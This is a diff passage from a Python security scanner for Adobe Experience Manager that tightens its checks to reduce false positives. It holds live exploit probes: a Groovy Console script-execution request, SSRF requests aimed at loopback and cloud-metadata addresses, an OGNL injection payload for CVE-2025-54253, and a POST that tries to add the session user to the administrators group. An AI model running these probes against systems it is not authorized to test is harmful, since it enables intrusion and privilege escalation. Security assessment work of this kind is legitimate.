-                            "https://adobe-consulting-services.github.io/acs-aem-commons/features/groovy-console/index.html",
-                        ],
-                        request=f"POST /bin/groovyconsole/post.json HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\n\nscript={up.quote(payload)}",
-                        response_snippet=snippet(rce.text, 500),
-                        role=self.role,
-                    ))
-                else:
-                    self.reporter.add(Finding(
-                        title="Groovy Console UI exposed",
-                        severity=SEV_HIGH, category=CAT_RCE,
-                        target=self.target + p,
-                        evidence="200 OK with 'Groovy' in body, but post.json execution blocked.",
-                        description=("Groovy Console interface is reachable. Even if "
-                                     "/post.json is currently denied, an authenticated "
-                                     "low-priv user may be able to execute scripts."),
-                        request=self.client.request_signature("GET", p),
-                        response_snippet=safe_response_text(r, 500),
-                        role=self.role,
-                    ))
-                return
+            if self._is_authwall(r):
+                continue
+            if "Groovy" not in (r.text or ""):
+                continue
+            # Functional proof only: actually execute a benign canary script.
+            payload = "out.println('AEM-HUNTER-CANARY-' + System.getProperty('user.name'))"
+            rce = self.client.post("/bin/groovyconsole/post.json",
+                                   data={"script": payload})
+            if rce is not None and rce.status_code == 200 and "AEM-HUNTER-CANARY" in (rce.text or ""):
+                self.reporter.add(Finding(
+                    title=f"Groovy Console RCE confirmed {self._role_tag()}",
+                    severity=SEV_CRITICAL, category=CAT_RCE,
+                    target=self.target + "/bin/groovyconsole/post.json",
+                    evidence=f"Canary echo via Groovy executed {self._who()}.",
+                    description=("ACS Commons Groovy Console is enabled and executes scripts. "
+                                 "Posting a script to /bin/groovyconsole/post.json gives "
+                                 "instant OS-level RCE as the AEM service user."),
+                    references=[
+                        "https://adobe-consulting-services.github.io/acs-aem-commons/features/groovy-console/index.html",
+                    ],
+                    request=f"POST /bin/groovyconsole/post.json HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\n\nscript={up.quote(payload)}",
+                    response_snippet=snippet(rce.text, 500),
+                    role=self.role,
+                ))
+            else:
+                # Shell renders but execution did not succeed -> INFO, not HIGH.
+                self.reporter.add(Finding(
+                    title=f"Groovy Console UI reachable (execution not confirmed) {self._role_tag()}",
+                    severity=SEV_INFO, category=CAT_EXPOSURE,
+                    target=self.target + p,
+                    evidence="200 with 'Groovy' in body, but post.json did NOT execute the canary.",
+                    description=("Groovy Console interface renders but script execution was "
+                                 "blocked for this session. Re-test with higher-priv role "
+                                 "cookies — if a role can execute here, that's critical RCE."),
+                    request=self.client.request_signature("GET", p),
+                    response_snippet=safe_response_text(r, 400),
+                    role=self.role,
+                ))
+            return
 
     # =======================================================================
     # 8. SSRF endpoints
@@ -1088,34 +1263,25 @@ class AEMHunter:
                 encoded = up.quote(canary, safe="")
                 path = tmpl.format(u=encoded)
                 r = self.client.get(path)
-                if r is None:
+                if r is None or self._is_authwall(r):
                     continue
                 body = safe_response_text(r, 2000)
-                hit_signature = False
-                if "ami-id" in body or "instance-id" in body:  # AWS
-                    hit_signature = True
-                if "Metadata-Flavor" in body or "computeMetadata" in body:
-                    hit_signature = True
-                if "Apache Felix" in body or "OSGi" in body:
-                    hit_signature = True
-                if "<title>Apache" in body and r.status_code == 200:
-                    hit_signature = True
-                # Some endpoints reflect status of probed URL
-                if (r.status_code == 200 and len(r.content) > 200 and
-                        ("status" in body.lower() or "error" in body.lower()
-                         or "code" in body.lower())):
-                    # weaker signal — only flag at LOW
-                    weak = True
-                else:
-                    weak = False
-
+                # Only flag when the response actually contains the probed
+                # internal service's fingerprint — no weak/speculative signals,
+                # those just create noise. Use an out-of-band canary for the rest.
+                hit_signature = (
+                    ("ami-id" in body or "instance-id" in body or "iam/" in body) or
+                    ("Metadata-Flavor" in body or "computeMetadata" in body) or
+                    (("Apache Felix Web Console" in body or "OSGi Management Console" in body)) or
+                    ("<title>Apache Felix" in body and r.status_code == 200)
+                )
                 if hit_signature:
                     self.reporter.add(Finding(
                         title=f"SSRF via {label} -> {canary_label}",
                         severity=SEV_CRITICAL if "169.254" in canary else SEV_HIGH,
                         category=CAT_SSRF, target=self.target + path,
                         cve=cve,
-                        evidence=f"Response contains target service signature for {canary}",
+                        evidence=f"Response contains the {canary_label} service signature.",
                         description=("The endpoint accepted an attacker-controlled URL "
                                      "and proxied the request server-side. This pivots "
                                      "into internal networks and cloud metadata services."),
@@ -1128,20 +1294,6 @@ class AEMHunter:
                         role=self.role,
                     ))
                     return  # one strong hit per SSRF target is enough
-                elif weak:
-                    self.reporter.add(Finding(
-                        title=f"Possible SSRF on {label}",
-                        severity=SEV_LOW, category=CAT_SSRF,
-                        target=self.target + path,
-                        cve=cve,
-                        evidence="Endpoint accepted external URL parameter (weak signal).",
-                        description=("Endpoint accepted an external URL but response did "
-                                     "not contain a reliable internal-service signature. "
-                                     "Re-test with a Burp Collaborator / interactsh canary."),
-                        request=self.client.request_signature("GET", path),
-                        response_snippet=snippet(body, 400),
-                        role=self.role,
-                    ))
 
     # =======================================================================
     # 9. WebDAV / CRX Package Manager XXE probe
@@ -1204,47 +1356,30 @@ class AEMHunter:
             return
         self.logger.section("CVE-2025-54253 (AEM Forms JEE /adminui/debug OGNL)")
 
-        # Step 1: presence
+        # Step 1: presence (must not be a login page)
         r = self.client.get("/adminui/debug")
-        if r is None or r.status_code in (404,):
+        if r is None or r.status_code == 404:
             self.logger.debug("/adminui/debug not present.")
             return
-        baseline_status = r.status_code
+        present = (r.status_code == 200 and not self._is_authwall(r))
 
-        if r.status_code == 200:
-            self.reporter.add(Finding(
-                title="AEM Forms JEE debug console reachable (CVE-2025-54253)",
-                severity=SEV_CRITICAL, category=CAT_CVE,
-                target=self.target + "/adminui/debug",
-                cve="CVE-2025-54253",
-                evidence="HTTP 200 on /adminui/debug without authentication.",
-                description=("Pre-auth AEM Forms on JEE debug console. Build chain via "
-                             "OGNL injection in `pluginAction` parameter -> RCE. Added to "
-                             "CISA KEV in late 2025."),
-                references=[
-                    "https://www.tenable.com/blog/cve-2025-54253-critical-rce-vulnerability-in-adobe-experience-manager-forms-on-jee",
-                    "https://helpx.adobe.com/security/products/aem/apsb25-50.html",
-                ],
-                request=self.client.request_signature("GET", "/adminui/debug"),
-                response_snippet=safe_response_text(r, 500),
-                role=self.role,
-            ))
-
-        # Step 2: try a benign OGNL evaluation that should yield a deterministic
-        # marker. We do NOT execute system commands.
+        # Step 2: benign OGNL evaluation -> deterministic marker. No system commands.
         marker = "AEMHUNTER" + "".join(random.choices(string.ascii_uppercase, k=6))
         payload = f"pluginAction=%23a%3d%22{marker}%22"
         url = "/adminui/debug?debug=true&" + payload
         r2 = self.client.get(url)
-        if r2 is not None and marker in (r2.text or ""):
+        confirmed = (r2 is not None and r2.status_code == 200
+                     and not self._is_authwall(r2) and marker in (r2.text or ""))
+
+        if confirmed:
             self.reporter.add(Finding(
-                title="CVE-2025-54253 OGNL evaluation confirmed",
+                title="CVE-2025-54253 OGNL evaluation confirmed (pre-auth RCE)",
                 severity=SEV_CRITICAL, category=CAT_CVE,
                 target=self.target + url,
                 cve="CVE-2025-54253",
                 evidence=f"Marker '{marker}' reflected in response after OGNL evaluation.",
-                description=("/adminui/debug evaluated an OGNL expression and reflected "
-                             "the result. This is unauthenticated remote code execution."),
+                description=("/adminui/debug evaluated an attacker-supplied OGNL expression "
+                             "and reflected the result. This is unauthenticated RCE (CISA KEV)."),
                 references=[
                     "https://www.tenable.com/blog/cve-2025-54253-critical-rce-vulnerability-in-adobe-experience-manager-forms-on-jee",
                     "https://www.cisa.gov/known-exploited-vulnerabilities-catalog",
@@ -1253,8 +1388,27 @@ class AEMHunter:
                 response_snippet=snippet(r2.text, 500),
                 role=self.role,
             ))
+        elif present:
+            # Reachable but OGNL not confirmed -> HIGH (worth manual follow-up), not CRITICAL.
+            self.reporter.add(Finding(
+                title="AEM Forms JEE debug console reachable (CVE-2025-54253 — unconfirmed)",
+                severity=SEV_HIGH, category=CAT_CVE,
+                target=self.target + "/adminui/debug",
+                cve="CVE-2025-54253",
+                evidence="HTTP 200 on /adminui/debug (not a login page); OGNL marker NOT reflected.",
+                description=("The AEM Forms on JEE debug console is reachable without auth but "
+                             "the OGNL probe did not reflect. Confirm manually — patched builds "
+                             "still serve the page but reject the injection."),
+                references=[
+                    "https://www.tenable.com/blog/cve-2025-54253-critical-rce-vulnerability-in-adobe-experience-manager-forms-on-jee",
+                    "https://helpx.adobe.com/security/products/aem/apsb25-50.html",
+                ],
+                request=self.client.request_signature("GET", "/adminui/debug"),
+                response_snippet=safe_response_text(r, 500),
+                role=self.role,
+            ))
         else:
-            self.logger.debug(f"/adminui/debug baseline {baseline_status}, OGNL marker not reflected.")
+            self.logger.debug("/adminui/debug present but gated/patched; nothing confirmed.")
 
     # =======================================================================
     # 11. CVE-2018-5006 / CVE-2018-12809 quick checks
@@ -1264,39 +1418,40 @@ class AEMHunter:
             return
         self.logger.section("Legacy AEM CVE probes")
 
-        # CVE-2018-5006 — SalesforceSecretServlet
-        r = self.client.get("/libs/mcm/salesforce/customer.json?checkType=authentication&instance_url=http://127.0.0.1:4502")
-        if r is not None and r.status_code == 200 and ("error" in (r.text or "").lower()
-                                                       or "Apache" in (r.text or "")):
+        # CVE-2018-5006 — SalesforceSecretServlet. Only flag if the loopback
+        # Felix console was actually fetched (real SSRF), not on a generic 200.
+        r = self.client.get("/libs/mcm/salesforce/customer.json?checkType=authentication&instance_url=http://127.0.0.1:4502/system/console")
+        if (r is not None and r.status_code == 200 and not self._is_authwall(r)
+                and ("Apache Felix" in (r.text or "") or "OSGi Management Console" in (r.text or ""))):
             self.reporter.add(Finding(
-                title="SalesforceSecretServlet reachable (CVE-2018-5006)",
+                title="SalesforceSecretServlet SSRF (CVE-2018-5006)",
                 severity=SEV_HIGH, category=CAT_CVE,
                 target=self.target + "/libs/mcm/salesforce/customer.json",
                 cve="CVE-2018-5006",
-                evidence=f"HTTP 200 with internal hit signature",
-                description=("Legacy MCM Salesforce connector accepted instance_url. "
-                             "SSRF pivot into internal services / cloud metadata."),
+                evidence="instance_url fetched the loopback Felix console (SSRF confirmed).",
+                description=("Legacy MCM Salesforce connector proxied instance_url to an "
+                             "internal service. SSRF pivot into internal hosts / cloud metadata."),
                 references=["https://nvd.nist.gov/vuln/detail/CVE-2018-5006"],
                 request=self.client.request_signature(
-                    "GET",
-                    "/libs/mcm/salesforce/customer.json?checkType=authentication&instance_url=...",
-                ),
+                    "GET", "/libs/mcm/salesforce/customer.json?...&instance_url=http://127.0.0.1:4502/system/console"),
                 response_snippet=safe_response_text(r, 400),
                 role=self.role,
             ))
 
-        # CVE-2018-12809 — ReportingServicesServlet
+        # CVE-2018-12809 — ReportingServicesServlet. Require the loopback console
+        # fingerprint to appear, not just "Apache" (which is everywhere).
         r = self.client.get("/etc/reports/userreport.html?path=http://127.0.0.1:4502/system/console")
-        if r is not None and r.status_code == 200 and "Apache" in (r.text or ""):
+        if (r is not None and r.status_code == 200 and not self._is_authwall(r)
+                and ("Apache Felix" in (r.text or "") or "OSGi Management Console" in (r.text or ""))):
             self.reporter.add(Finding(
                 title="ReportingServicesServlet SSRF (CVE-2018-12809)",
                 severity=SEV_HIGH, category=CAT_CVE,
                 target=self.target + "/etc/reports/userreport.html",
                 cve="CVE-2018-12809",
-                evidence="Reporting servlet proxied internal request signature.",
-                description="AEM Reporting servlet allowed attacker-controlled path -> SSRF.",
+                evidence="Reporting servlet fetched the loopback Felix console (SSRF confirmed).",
+                description="AEM Reporting servlet allowed an attacker-controlled path -> SSRF.",
                 references=["https://nvd.nist.gov/vuln/detail/CVE-2018-12809"],
-                request=self.client.request_signature("GET", "/etc/reports/userreport.html?path=..."),
+                request=self.client.request_signature("GET", "/etc/reports/userreport.html?path=http://127.0.0.1:4502/system/console"),
                 response_snippet=safe_response_text(r, 400),
                 role=self.role,
             ))
@@ -1452,58 +1607,63 @@ class AEMHunter:
                 role=self.role,
             ))
 
-        # 15c — Reach admin-only endpoints to test privilege boundary
-        admin_only = [
-            ("/system/console/bundles.json",          SEV_CRITICAL, "OSGi bundles JSON"),
-            ("/crx/de/index.jsp",                     SEV_CRITICAL, "CRXDE Lite"),
-            ("/crx/packmgr/list.jsp",                 SEV_HIGH,     "Package list"),
-            ("/etc/replication.json",                 SEV_HIGH,     "Replication agents"),
-            ("/etc/cloudservices.infinity.json",      SEV_CRITICAL, "Cloud services tree"),
-            ("/libs/granite/security/post/authorizables.json", SEV_HIGH, "Authorizables"),
-            ("/home/users.1.json",                    SEV_HIGH,     "Users tree"),
-            ("/home/groups.1.json",                   SEV_HIGH,     "Groups tree"),
-            ("/bin/groovyconsole.html",               SEV_CRITICAL, "Groovy Console"),
-            ("/var/audit.json",                       SEV_MEDIUM,   "Audit log"),
+        # 15c — Privilege-boundary check on admin-only DATA endpoints.
+        # (Console shells like CRXDE/Felix/Groovy are verified functionally and
+        #  role-aware in check_consoles, so they are intentionally NOT here —
+        #  this avoids the "shell returns 200" false positive.)
+        admin_data = [
+            ("/etc/replication.json",                   SEV_HIGH,   "Replication agents config", r"(transportUri|agentClass)"),
+            ("/etc/cloudservices.infinity.json",        SEV_HIGH,   "Cloud services tree",       r"jcr:primaryType"),
+            ("/home/users.1.json",                      SEV_HIGH,   "Users tree",                r"(rep:User|rep:authorizableId)"),
+            ("/home/groups.1.json",                     SEV_HIGH,   "Groups tree",               r"(rep:Group|rep:principalName)"),
+            ("/var/audit.json",                         SEV_MEDIUM, "Audit log",                 r"jcr:primaryType"),
+            ("/libs/granite/security/post/authorizables.json", SEV_MEDIUM, "Authorizables service", r"(authorizableId|\"users\")"),
         ]
-        for path, sev, label in admin_only:
+        for path, sev, label, sig in admin_data:
             r = self.client.get(path)
-            if r is None:
+            if r is None or r.status_code != 200 or self._is_authwall(r):
                 continue
-            if r.status_code == 200 and len(r.content) > 80:
-                body = safe_response_text(r, 2000)
-                # filter common 'login' redirect bodies
-                if "j_username" in body.lower() or "please log in" in body.lower():
-                    continue
+            body = safe_response_text(r, 2000)
+            stripped = body.lstrip()
+            if not (stripped.startswith("{") or stripped.startswith("[")):
+                continue
+            if stripped in ("{}", "[]"):
+                continue
+            if sig and not re.search(sig, body, re.I):
+                continue
+            eff = SEV_CRITICAL if RE_SECRET.search(body) else sev
+            self.reporter.add(Finding(
+                title=f"[{self.role}] can read admin data: {label}",
+                severity=eff, category=CAT_ROLE,
+                target=self.target + path,
+                evidence=f"HTTP 200 JSON ({len(r.content)} bytes) returned to this session",
+                description=(f"This authenticated session read {label}, which a "
+                             "low-privilege role should not be able to access. "
+                             "Privilege-boundary violation — confirm against the role's "
+                             "intended permissions."),
+                request=self.client.request_signature("GET", path),
+                response_snippet=snippet(body, 600),
+                role=self.role,
+            ))
+
+        # 15d — Attempt self-escalation to administrators (best-effort, verify manually).
+        if self._csrf_token:
+            r = self.client.post("/home/users/a/admin.rw.html",
+                                 data={"addMembers": "administrators"},
+                                 headers={"CSRF-Token": self._csrf_token})
+            if (r is not None and r.status_code in (200, 201)
+                    and not self._is_authwall(r)
+                    and "error" not in (r.text or "").lower()):
                 self.reporter.add(Finding(
-                    title=f"[{self.role}] can reach admin surface: {label}",
-                    severity=sev, category=CAT_ROLE,
-                    target=self.target + path,
-                    evidence=f"HTTP 200 with {len(r.content)} bytes",
-                    description=(f"This authenticated session should not be able to view "
-                                 f"{label}. Privilege boundary violation — flag for the team."),
-                    request=self.client.request_signature("GET", path),
-                    response_snippet=snippet(body, 600),
+                    title=f"[{self.role}] possible privilege escalation via :member= (verify manually)",
+                    severity=SEV_MEDIUM, category=CAT_ROLE,
+                    target=self.target + "/home/users/a/admin.rw.html",
+                    evidence=f"Membership-change POST accepted (HTTP {r.status_code}).",
+                    description=("The Sling POST servlet accepted a group-membership change "
+                                 "request. This MAY indicate escalation — manually verify by "
+                                 "listing administrators afterwards before reporting."),
                     role=self.role,
                 ))
-
-        # 15d — Try to add ourselves to administrators
-        if self._csrf_token:
-            payload = {"addMembers": "administrators"}
-            r = self.client.post("/home/users/a/admin.rw.html",
-                                 data=payload, headers={"CSRF-Token": self._csrf_token})
-            if r is not None and r.status_code in (200, 201):
-                body = safe_response_text(r, 500)
-                if "error" not in body.lower():
-                    self.reporter.add(Finding(
-                        title=f"[{self.role}] may be able to escalate via :member=",
-                        severity=SEV_CRITICAL, category=CAT_ROLE,
-                        target=self.target + "/home/users/a/admin.rw.html",
-                        evidence=f"POST accepted with status {r.status_code}",
-                        description=("Privilege escalation — Sling POST servlet accepted a "
-                                     "group-membership change. Manually validate by listing "
-                                     "administrators afterwards."),
-                        role=self.role,
-                    ))
 
     # =======================================================================
     # 16. Bundle upload attempt (authenticated, opt-in / aggressive)
@@ -1518,7 +1678,7 @@ class AEMHunter:
             return
         if r.status_code in (200, 302):
             # The console returning 302 to login is benign; only 200 is interesting
-            if r.status_code == 200 and "Felix" in (r.text or ""):
+            if r.status_code == 200 and "Felix" in (r.text or "") and not self._is_authwall(r):
                 self.reporter.add(Finding(
                     title=f"[{self.role}] can POST to /system/console/bundles",
                     severity=SEV_CRITICAL, category=CAT_ROLE,
@@ -1581,6 +1741,7 @@ class AEMHunter:
             self.fingerprint()
             self.check_default_credentials()
             self.check_exposed_endpoints()
+            self.check_consoles()
             self.check_dispatcher_bypasses()
             self.check_sling_info_disclosure()
             self.check_querybuilder()
